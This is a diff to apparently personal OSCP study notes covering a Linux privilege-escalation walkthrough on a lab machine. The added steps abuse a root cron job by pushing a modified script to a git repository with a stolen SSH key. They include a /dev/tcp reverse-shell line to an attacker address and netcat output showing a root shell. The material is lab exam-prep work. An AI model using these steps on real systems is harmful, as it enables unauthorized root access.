@@ -2079,6 +2079,7 @@ gcc 624.c -m32 -o exploit
 ````
 ## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
 ### Crontab/Git
+In this priv esc scenario we logged in via ssg, found that a cron job was running bash file with root privs. We could git clone that same repo with the private key we find in user gits ssh folder and edit the bash file to give us a rce as root.
 ````
 /var/spool/anacron:
 total 20
@@ -2110,7 +2111,7 @@ cat backups.sh
 ````
 cat backups.sh 
 #!/bin/bash
-bash -i >& /dev/tcp/192.168.45.191/18030 0>&1
+sh -i >& /dev/tcp/192.168.45.191/18030 0>&1
 ````
 ````
 chmod +x backups.sh
@@ -2129,8 +2130,8 @@ no changes added to commit (use "git add" and/or "git commit -a")
 ````
 #### Git setup / exploit
 ````
-git config --global user.email "root@hunit"
-git config --global user.name "root"
+git config --global user.name "git"
+git config --global user.email "git@hunit" #User is the same from the private key git@
 ````
 ````
 GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/Hunit/id_rsa -p 43022' git add --all
@@ -2149,10 +2150,17 @@ Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
 To 192.168.214.125:/git-server
    b50f4e5..872aa26  master -> master
 ````
-
-![image](https://github.com/xsudoxx/OSCP/assets/127046919/44038636-d0c0-46a9-94a3-aa1e7613eea8)
-
-
+````
+nc -nlvp 18030                                   
+listening on [any] 18030 ...
+connect to [192.168.45.191] from (UNKNOWN) [192.168.214.125] 48038
+sh: cannot set terminal process group (15929): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-5.0# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+sh-5.0# 
+````
 ### Exiftool priv esc
 ````
 SHELL=/bin/sh
